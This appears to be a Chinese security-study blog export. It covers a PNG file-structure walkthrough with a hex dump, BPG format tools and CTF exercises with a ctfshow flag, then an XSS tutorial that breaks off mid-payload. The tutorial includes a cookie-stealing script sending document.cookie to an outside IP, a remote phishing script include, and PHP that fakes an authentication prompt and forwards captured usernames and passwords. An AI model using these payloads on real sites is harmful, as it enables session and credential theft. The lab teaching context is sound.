chunks)综合下表中：</p><table><thead><tr><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>数据块符号</strong></td><td><strong>数据块名称</strong></td><td><strong>多数据块</strong></td><td><strong>可选否</strong></td><td><strong>位置限制</strong></td></tr><tr><td>IHDR</td><td>文件头数据块</td><td>否</td><td>否</td><td>第一块</td></tr><tr><td>cHRM</td><td>基色和白色点数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>gAMA</td><td>图像γ数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>sBIT</td><td>样本有效位数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>PLTE</td><td>调色板数据块</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>bKGD</td><td>背景颜色数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>hIST</td><td>图像直方图数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>tRNS</td><td>图像透明数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>oFFs</td><td>(专用公共数据块)</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>pHYs</td><td>物理像素尺寸数据块</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>sCAL</td><td>(专用公共数据块)</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>IDAT</td><td>图像数据块</td><td>是</td><td>否</td><td>与其他IDAT连续</td></tr><tr><td>tIME</td><td>图像最后修改时间数据块</td><td>否</td><td>是</td><td>无限制</td></tr><tr><td>tEXt</td><td>文本信息数据块</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>zTXt</td><td>压缩文本数据块</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>fRAc</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFg</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFt</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFx</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>IEND</td><td>图像结束数据</td><td>否</td><td>否</td><td>最后一个数据块</td></tr></tbody></table><p>tEXt和zTXt数据块中的标准关键字：</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>关键字</strong></td><td><strong>说明</strong></td></tr><tr><td>Title</td><td>图像名称或者标题</td></tr><tr><td>Author</td><td>图像作者名</td></tr><tr><td>Description</td><td>图像说明</td></tr><tr><td>Copyright</td><td>版权声明</td></tr><tr><td>CreationTime</td><td>原图创作时间</td></tr><tr><td>Software</td><td>创作图像使用的软件</td></tr><tr><td>Disclaimer</td><td>弃权</td></tr><tr><td>Warning</td><td>图像内容警告</td></tr><tr><td>Source</td><td>创作图像使用的设备</td></tr><tr><td>Comment</td><td>各种注释</td></tr></tbody></table><h3 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h3><p>为了便于研究，我在本地找了个24x24像素的图片：</p><p>用十六进制打开后是这样的：</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><code>&lt;br&gt;1&lt;br&gt;2&lt;br&gt;3&lt;br&gt;4&lt;br&gt;5&lt;br&gt;6&lt;br&gt;7&lt;br&gt;8&lt;br&gt;9&lt;br&gt;10&lt;br&gt;11&lt;br&gt;12&lt;br&gt;13&lt;br&gt;14&lt;br&gt;15&lt;br&gt;16&lt;br&gt;17&lt;br&gt;18&lt;br&gt;19&lt;br&gt;20&lt;br&gt;21&lt;br&gt;22&lt;br&gt;23&lt;br&gt;24&lt;br&gt;25&lt;br&gt;26&lt;br&gt;27&lt;br&gt;28&lt;br&gt;29&lt;br&gt;30&lt;br&gt;31&lt;br&gt;32&lt;br&gt;33&lt;br&gt;34&lt;br&gt;35&lt;br&gt;36&lt;br&gt;37&lt;br&gt;38&lt;br&gt;39&lt;br&gt;40&lt;br&gt;41&lt;br&gt;42&lt;br&gt;43&lt;br&gt;44&lt;br&gt;45&lt;br&gt;46&lt;br&gt;47&lt;br&gt;48&lt;br&gt;49&lt;br&gt;50&lt;br&gt;51&lt;br&gt;52&lt;br&gt;53&lt;br&gt;54&lt;br&gt;55&lt;br&gt;56&lt;br&gt;57&lt;br&gt;58&lt;br&gt;59&lt;br&gt;</code></td><td><code>&lt;br&gt;0000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR&lt;br&gt;0000010: 0000 0018 0000 0018 0806 0000 00e0 773d  ..............w=&lt;br&gt;0000020: f800 0000 1974 4558 7453 6f66 7477 6172  .....tEXtSoftwar&lt;br&gt;0000030: 6500 4164 6f62 6520 496d 6167 6552 6561  e.Adobe ImageRea&lt;br&gt;0000040: 6479 71c9 653c 0000 0344 4944 4154 78da  dyq.e&lt;...DIDATx.&lt;br&gt;0000050: b454 4b48 5b51 10bd 792f 2646 a346 7411  .TKH[Q..y/&amp;F.Ft.&lt;br&gt;0000060: 450b cac3 6840 8c14 0242 8542 e9aa ab42  E...h@...B.B...B&lt;br&gt;0000070: 5785 8614 c428 b4d0 5569 b108 5dbb 29b4  W....(..Ui..].).&lt;br&gt;0000080: 1b05 a5ab 6cb3 2a14 0ab5 8b42 75a3 d188  ....l.*....Bu...&lt;br&gt;0000090: 82c6 0ff1 4320 a2e2 2f7e 12ed 9c47 e671  ....C ../~...G.q&lt;br&gt;00000a0: 8d2f 8950 3a30 dcc7 bb33 67e6 cee7 5826  ./.P:0...3g...X&amp;&lt;br&gt;00000b0: 2626 8499 288a a2ab d56a d555 55d5 57d7  &amp;&amp;..(....j.UU.W.&lt;br&gt;00000c0: d7d7 be6c 36fb fef2 f232 45a7 b8ba ba12  ...l6....2E.....&lt;br&gt;00000d0: c160 5014 13ab d94f 8bc5 72e3 24e0 1e9f  .`P....O..r.$...&lt;br&gt;00000e0: cff7 b9ae ae4e 4c4e 4eda 3299 4c00 777c  .....NLNN.2.L.w|&lt;br&gt;00000f0: 5f4c 1472 16f9 9a07 2e6a 6b6b 875a 5b5b  _L.r.....jkk.Z[[&lt;br&gt;0000100: 454d 4d8d e8ea ea7a 4eff 3ce2 8ea2 3018  EMM....zN.&lt;...0.&lt;br&gt;0000110: 94cb c28a 7f04 765f d3b4 27ec d0d8 d8a8  ......v_..&#39;.....&lt;br&gt;0000120: 5655 55bd 639b 9201 a8b6 a8af 516b 9bcd  VUU.c.......Qk..&lt;br&gt;0000130: 26ca caca f46f 0020 7bb7 db6d 38d8 ed76  &amp;....o. &#123;..m8..v&lt;br&gt;0000140: d1d1 d1f1 82ee 34d8 940c 0023 00c2 11e0  ......4....#....&lt;br&gt;0000150: 1c20 975d 2781 3d75 381c 379c 9a9b 9b55  . .]&#39;.=u8.7....U&lt;br&gt;0000160: 2ad7 1012 bb73 0028 c073 1373 8f02 3c68  *....s.(.s.s..&lt;h&lt;br&gt;0000170: 6b6b fb44 25b9 e554 5e5e 2eba bbbb f18a  kk.D%..T^^......&lt;br&gt;0000180: c791 4844 2b16 c012 0e87 fd04 faac bebe  ..HD+...........&lt;br&gt;0000190: be85 cad1 e272 b97c 04a0 e245 4ea7 530f  .....r.|...EN.S.&lt;br&gt;00001a0: 5c48 8e8f 8f45 3a9d d6f5 f0f0 7091 747b  \H...E:.....p.t&#123;&lt;br&gt;00001b0: 7777 779d feff a649 0b07 0281 acb5 baba  www....I........&lt;br&gt;00001c0: fa97 dfef 7710 7041 309e 2c79 ba20 4800  ....w.pA0.,y. H.&lt;br&gt;00001d0: 9a13 2f81 7a11 7479 79b9 3f16 8ba1 ae63  ../.z.tyy.?....c&lt;br&gt;00001e0: caf9 f979 120b 83c5 81e6 03e3 8e4f 59e5  ...y.........OY.&lt;br&gt;00001f0: a010 5e3c f405 2705 dbd6 7b90 4aa5 1ecd  ..^&lt;..&#39;...&#123;.J...&lt;br&gt;0000200: cdcd 250e 0e0e c4c5 c585 a080 fa49 0686  ..%..........I..&lt;br&gt;0000210: 1303 ca81 7007 1bf6 c1f7 d9d9 9958 5b5b  ....p........X[[&lt;br&gt;0000220: 1384 f73a 140a 7de3 3d58 27e9 8d46 a371  ...:..&#125;.=X&#39;..F.q&lt;br&gt;0000230: 0491 c14a 89fc 1204 01f8 d4d4 1461 87be  ...J.........a..&lt;br&gt;0000240: e46f 7262 6363 a377 6666 6671 6f6f cfc8  .orbcc.wfffqoo..&lt;br&gt;0000250: dc6c cb65 651b 3439 1e8f 03bc 8fc0 c70a  .l.ee.49........&lt;br&gt;0000260: 5145 3291 483c 5c58 5888 a251 a5c0 5989  QE2.H&lt;\XX..Q..Y.&lt;br&gt;0000270: f8c4 d6d6 5676 7a7a fae5 c0c0 c0f8 ad3d  ....Vvzz.......=&lt;br&gt;0000280: c823 ac14 3df3 c3d1 d191 d1e4 620a 5f94  .#..=.......b._.&lt;br&gt;0000290: 6673 7333 3238 38f8 b520 9be6 3887 ff79  fss3288.. ..8..y&lt;br&gt;00002a0: 989b f85f 7e3f e4a4 b0f1 74af 1525 3b36  ..._~?....t..%;6&lt;br&gt;00002b0: 8423 ed45 6745 4585 012c 4f92 3c41 fc02  .#.EgEE..,O.&lt;A..&lt;br&gt;00002c0: d008 ed90 7774 74d4 5694 4df9 248e f182  ....wtt.V.M.$...&lt;br&gt;00002d0: 3278 4ccd 9aca 8161 039f caca 4a80 9b52  2xL....a....J..R&lt;br&gt;00002e0: b855 1e49 3a55 32f6 c209 60bc 4068 3aa6  .U.I:U2...`.@h:.&lt;br&gt;00002f0: 8b1a 9aa6 041c 4429 3a6f 7150 3000 9d9d  ......D):oqP0...&lt;br&gt;0000300: 641e 33ed 8114 a485 0238 4178 703c 3939  d.3......8Axp&lt;99&lt;br&gt;0000310: 11c9 6452 acac acfc 248e 798b 9d21 b0e1  ..dR....$.y..!..&lt;br&gt;0000320: f6f6 f6fe a6a6 2683 5ec0 5b94 948f eec3  ......&amp;.^.[.....&lt;br&gt;0000330: 055f c001 3015 5838 64bc baba 1add d9d9  ._..0.X8d.......&lt;br&gt;0000340: 01f0 0f76 a0cd 7d33 3f3f 3f42 73ff d1e3  ...v..&#125;3???Bs...&lt;br&gt;0000350: f104 1b1a 1a54 f890 6805 a748 9a92 3fb4  .....T..h..H..?.&lt;br&gt;0000360: e6df 691f dcfb fbfb 2366 19e5 64fb f4f4  ..i.....#f..d...&lt;br&gt;0000370: b46f 7676 7664 6969 6998 5ed1 43fd 1837  .ovvvdiii.^.C..7&lt;br&gt;0000380: a5eb bb50 c2bf 8822 feb3 fc15 6000 74fe  ...P...&quot;....`.t.&lt;br&gt;0000390: 7622 c159 82da 0000 0000 4945 4e44 ae42  v&quot;.Y......IEND.B&lt;br&gt;00003a0: 6082 0a                                  `..&lt;br&gt;</code></td></tr></tbody></table><p>接下来我们试着分析一下：</p><p>首先是八个字节的文件头标志，标识着png文件：</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><code>&lt;br&gt;1&lt;br&gt;</code></td><td><code>&lt;br&gt;8950 4e47 0d0a 1a0a&lt;br&gt;</code></td></tr></tbody></table><p>接下来的地方就是IHDR数据块了：</p><p>0000 000d说明IHDR头块长为13</p><p>4948 4452IHDR标识（ascii码为IHDR）</p><p>下面是IHDR数据块的实际内容</p><p>0000 0018图像的宽，24像素</p><p>0000 0018图像的高，24像素</p><p>08 表示色深，这里是2^8&#x3D;256，即这是一个256色的图像</p><p>06 颜色类型，查表可知这是带α通道数据的真彩色图像</p><p>00 PNG Spec规定此处总为0（非0值为将来使用更好的压缩方法预留），表示使压缩方法(LZ77派生算法)</p><p>00 同上</p><p>00 非隔行扫描</p><p>e0 773d f8 CRC校验</p><p>以上分析了第一个IHDR块的内容，其他块的分析方法类似，比如接下来的就是tEXt块了，很简单，不做分析了。（当然这里还有重要的IDAT块，这是图像的实际内容）</p><p>最后得有个IEND数据块，这部分正如上所说，通常都应该是</p><p>00 00 00 00 49 45 4E 44 AE 42 60 82</p><p>由于我用的是vim打开，vim在文件最后都会恶心的自己加上0a换行，当然这并没有什么坏的影响。不过这也提醒了我们一个问题，既然在IEND块后面添加任何的字符都对文件的打开造成不了影响，那我们就可以在这里藏一些数据了（当然这种藏法很low）。。。</p><p>OK，这就是png文件的基本构造了。</p><h2 id="例题：可能会修改文件名"><a href="#例题：可能会修改文件名" class="headerlink" title="例题：可能会修改文件名"></a>例题：可能会修改文件名</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715249478476-fc4500f4-d179-4a9e-8ca3-b739743ed423.png"></p><p>可能是头文件出问题</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715249511415-c2ce3779-2cd3-4e8f-bf8a-75c7641c71f1.png"></p><p>看上面的8个字节头文件标志</p><p>89 50 4E 47 0D 0A 1A 0A</p><p>改完就可以打开图片了</p><h1 id="BPG文件格式详解"><a href="#BPG文件格式详解" class="headerlink" title="BPG文件格式详解"></a>BPG文件格式详解</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>BPG（Better Portable Graphics）是一种新的图像格式。 其目的是在质量或文件大小成问题时替换JPEG图像格式。 它的主要优点是：</p><p>1、压缩比高。 对于类似的质量，文件比JPEG小得多。</p><p>2、大多数Web浏览器都支持小型Javascript解码器（gzip压缩大小：56 KB）。</p><p>3、基于HEVC开放视频压缩标准的子集。</p><p>4、支持与JPEG（灰度，YCbCr 4：2：0,4：2：2,4：4：4）相同的色度格式，以减少转换过程中的损耗。 支持Alpha通道。 还支持RGB，YCgCo和CMYK颜色空间。</p><p>5、本机支持每通道8至14位，以获得更高的动态范围。</p><p>6、支持无损压缩。</p><p>7、可以包括各种元数据（例如EXIF，ICC配置文件，XMP）。</p><p>8、动画支持。</p><p>原文链接：<a href="https://blog.csdn.net/CT_WJ/article/details/97812299">https://blog.csdn.net/CT_WJ&#x2F;article&#x2F;details&#x2F;97812299</a></p><h2 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h2><p>只考虑电脑上，Honeyview 是目前我评价最高的看图软件，地址：<a href="https://www.bandisoft.com/honeyview/">www.bandisoft.com/honeyview</a>。截面乍一看有点古朴：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721531586323-c3eaaf07-e067-4b09-a548-d29e7041d0ae.png"></p><p>安装之后设置一下，让菜单自动隐藏就没问题了，实际用的时候只会显示个窗口边框。现在还没遇到它不支持的图片格式，除了矢量图，比如svg 和cad 的格式。</p><h2 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h2><p>图片批量转换成bpg 可以用honeyview 的资源管理器右键菜单，也可以用一个叫romeolight bpgconv 的工具，专门用来把jpg 和png 批量转换成bpg。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721531685378-62100093-7327-4704-9842-13ae5a729073.png"></p><p>把图片文件夹拖进去，工具会筛选出所有jpg，jpeg 和png 文件，然后点一下左上角的三角按钮就开始批量转换。文件数量比较多，图片内容比较复杂的话转换时间会很长，吃CPU，可以全核跑满。一批图片处理完之后点左上角的圆圈箭头清空列表，然后可以再往里拖一批，不先清空的话它会把处理完的图片再处理一遍。</p><p>转换之前，最好先点开右上角的三条杠，打开菜单，调整一下输出文件的位置：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721531712314-da14e416-8e4e-4283-862c-a9416aa3a446.png"></p><p>默认是自动在桌面新建个文件夹，所有输出文件放在里面，切换成“Same Location as File”，输出文件就会放在源文件同目录下，如果一次转换多个文件夹，这样图片分类不会乱。其他设置都不用动。转换完再手动把所有jpg，png 源文件删除掉就行了，比如直接rm *.jpg。</p><p>这个软件的官网似乎已经挂了，windows 上想安装，可以用scoop 安装个绿色版：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">scoop </span><span class="hljs-keyword">install </span><span class="hljs-keyword">bpgconv</span><br></code></pre></td></tr></table></figure><p>或者下载我复制出来的绿色包：<a href="https://download.csdn.net/download/Etberzin/86504852">download.csdn.net&#x2F;download&#x2F;Etberzin&#x2F;86448960</a>，0 积分。再或者，随便搜个下载站，风险自担。</p><h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><p>但是转换成bpg 之后，windows 资源管理器里不能显示图片预览，想找个图片就比较麻烦，honeyview 可以打开bpg，但是没有给资源管理器集成bpg 的预览功能。所以又要找个工具，Simple BPG Image Viewer ：github.com&#x2F;asimba&#x2F;pybpgviewer&#x2F;releases&#x2F;tag&#x2F;v1.28，这也是个bpg 图片查看器，不如honeyview 好用，但是提供了bpg 预览的插件。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721531820822-3fca6a90-c152-4258-9fd6-edf63166c877.png"></p><p>点击红圈里的链接下载个安装包，一路ok 安装完，可能需要把软件启动一次，然后用资源管理器打开有bpg 图片的文件夹，图片预览应该就能自动加载出来了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>日常使用可能还是webp 更方便，支持的范围更广。要是所有图片都拿bpg 存，到时候想给别人发个图还得先转换成jpg 或者webp。只是我感觉webp 压出明显差异的可能性更大，bpg 最适合用的场合是那些估计只有自己看的一大堆图片库存，比如瑟图~ 不过几千张瑟图转换一波能省的空间也不过就几个GB 而已，大概是把一共5GB 的的图片文件夹压缩到500MB 这个程度，有没有用~ 自己看呗。</p><p>原文链接：<a href="https://blog.csdn.net/Etberzin/article/details/126502703">https://blog.csdn.net/Etberzin/article/details/126502703</a></p><h2 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h2><p>看到bpg格式的图片拖入honeyview就可以看到flag了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721532010959-1aaf41bd-4461-4dea-a80d-a65f1c851cfe.png"></p><p>ctfshow{aade771916df7cde3009c0e631f9910d}</p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS</title>
    <link href="/2025/03/22/XSS/"/>
    <url>/2025/03/22/XSS/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>跨站脚本攻击（Cross-Site Scripting，简称XSS）作为一种广泛存在的web应用程序安全漏洞，其机制在于利用了客户端与服务器之间数据交换过程中的信任链被恶意破坏。该类攻击的核心原理是攻击者通过向Web应用程序注入精心构造的、能够在受害者浏览器环境下执行的恶意脚本代码。这些注入的脚本在用户无意识的情况下被执行，不仅能够非法获取用户的cookies、session令牌等身份认证信息，还可能操纵用户的浏览器发起进一步的非授权操作，对用户隐私和网站安全性构成严重威胁。</p><h2 id="反射型XSS（Non-persistent-XSS）"><a href="#反射型XSS（Non-persistent-XSS）" class="headerlink" title="反射型XSS（Non-persistent XSS）"></a>反射型XSS（Non-persistent XSS）</h2><p>这种类型的XSS攻击依赖于用户点击由攻击者精心构造的带有恶意脚本参数的URL，而这些URL通常伪装成合法链接或者嵌入在电子邮件、即时消息等载体中。当服务器接收到这样的请求后，未经验证就将含有恶意脚本的数据直接反映在响应页面中，进而触发执行。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://example.com/search?q=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;你已被黑客入侵&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="存储型XSS（Persistent-or-Stored-XSS）"><a href="#存储型XSS（Persistent-or-Stored-XSS）" class="headerlink" title="存储型XSS（Persistent or Stored XSS）"></a>存储型XSS（Persistent or Stored XSS）</h2><p>存储型XSS具有持久性特点。攻击者将恶意脚本永久地存储在目标服务器上，每当任何用户访问到包含此类恶意内容的页面时，浏览器都会执行其中的恶意脚本。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="基于DOM的XSS（DOM-Based-XSS）"><a href="#基于DOM的XSS（DOM-Based-XSS）" class="headerlink" title="基于DOM的XSS（DOM-Based XSS）"></a>基于DOM的XSS（DOM-Based XSS）</h2><p>这种类型的XSS不涉及服务器端的数据存储，而是发生在客户端层面，即浏览器解析和动态修改DOM树的过程中。如果Web应用程序错误地使用来自不可信源的数据更新DOM，并且没有实施恰当的防御措施，攻击者就可以利用DOM-XSS漏洞注入恶意脚本。</p><p>不涉及服务器端，而是由前端JavaScript代码错误处理用户输入导致的。当浏览器DOM解析过程中引入了不可信的数据并且没有正确地对其进行净化，就会产生DOM-Based XSS。</p><h2 id="xss无过滤常见标签"><a href="#xss无过滤常见标签" class="headerlink" title="xss无过滤常见标签"></a>xss无过滤常见标签</h2><p>弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;1&quot;</span>);&lt;/script&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">prompt</span>(<span class="hljs-string">&quot;2&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;3&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;1&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>JS支持unicode编码，但是不可以对script标签进行编码</p><h2 id="XSS获取cookie"><a href="#XSS获取cookie" class="headerlink" title="XSS获取cookie"></a>XSS获取cookie</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;&quot;&gt;&lt;script&gt;document.location.href=&#x27;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//192.168.31.110/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><h2 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script src=<span class="hljs-string">&quot;http://192.168.31.172/pikachu/pkxss/xfish/fish.php&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><figure class="highlight php"><figcaption><span>file:fish.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// var_dump($_SERVER);</span><br><span class="hljs-keyword">if</span> ((!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_USER&#x27;</span>])) || (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_PW&#x27;</span>]))) &#123;<br><span class="hljs-comment">//发送认证框，并给出迷惑性的info</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;WWW-Authenticate: Basic realm=&#x27;认证&#x27;&quot;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Authorization Required.&#x27;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_USER&#x27;</span>])) &amp;&amp; (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_AUTH_PW&#x27;</span>])))&#123;<br><span class="hljs-comment">//将结果发送给搜集信息的后台,请将这里的IP地址修改为管理后台的IP</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://192.168.1.15/pkxss/xfish/xfish.php?username=<span class="hljs-subst">&#123;$_SERVER[PHP_AUTH_USER]&#125;</span>&amp;password=<span class="hljs-subst">&#123;$_SERVER[PHP_AUTH_PW]&#125;</span>&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><figcaption><span>file:xfish.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;../inc/config.inc.php&#x27;</span>;<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;../inc/mysql.inc.php&#x27;</span>;<br><span class="hljs-variable">$link</span>=<span class="hljs-title function_ invoke__">connect</span>();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$referer</span>=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable">$referer</span>.=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br>    <span class="hljs-variable">$time</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d g:i:s&#x27;</span>);<br>    <span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;insert fish(time,username,password,referer) </span><br><span class="hljs-string">    values(&#x27;<span class="hljs-subst">$time</span>&#x27;,&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$password</span>&#x27;,&#x27;<span class="hljs-subst">$referer</span>&#x27;)&quot;</span>;<br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$link</span>, <span class="hljs-variable">$query</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h2><figure class="highlight js"><figcaption><span>file:base.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;scirpt&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);&lt;/script&gt;<br><br>#图片加载错误触发<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> 